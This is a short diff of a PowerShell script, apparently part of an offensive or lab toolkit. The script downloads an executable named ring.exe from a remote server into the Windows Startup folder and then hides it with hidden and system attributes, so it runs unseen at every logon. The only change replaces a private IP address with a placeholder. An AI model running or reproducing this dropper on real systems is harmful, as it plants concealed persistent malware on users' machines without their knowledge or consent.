@@ -8,7 +8,7 @@ $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $target = Join-Path $startup "ring.exe"
 
 # Download ring.exe to the Startup folder
-Invoke-WebRequest -Uri "http://192.168.1.109/tools/ring.exe" -OutFile $target
+Invoke-WebRequest -Uri "http://<Server_IP>/tools/ring.exe" -OutFile $target
 
 # Hide the file (set attributes to Hidden and System)
 attrib +h +s $target
